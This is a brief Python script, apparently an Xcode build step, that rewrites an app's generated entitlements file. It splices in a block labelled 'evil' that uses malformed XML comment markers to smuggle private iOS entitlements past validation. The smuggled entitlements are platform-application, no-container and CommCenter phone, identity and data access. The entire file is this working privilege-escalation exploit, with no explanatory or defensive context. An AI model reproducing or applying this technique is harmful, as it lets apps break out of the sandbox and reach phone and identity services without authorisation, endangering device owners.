import os
# preinstalled python is python2
filename = '/'.join(map(os.environ.get, ('TARGET_TEMP_DIR', 'FULL_PRODUCT_NAME'))) + '.xcent'
print("patch file named " + filename)

evil = '''
    <!---><!-->
    <key>platform-application</key>
    <true/>
    <key>com.apple.private.security.no-container</key>
    <true/>
    <key>com.apple.CommCenter.fine-grained</key>
    <array>
        <string>spi</string>
        <string>phone</string>
        <string>identity</string>
        <string>data-usage</string>
        <string>data-allowed</string>
        <string>data-allowed-write</string>
    </array>
    <!-- -->
'''
with open(filename, 'r') as fp:
  buf = fp.read()
cursor = buf.rfind('</dict>')
output = buf[0:cursor] + evil + buf[cursor:]
with open(filename, 'w') as fp:
  fp.write(output)

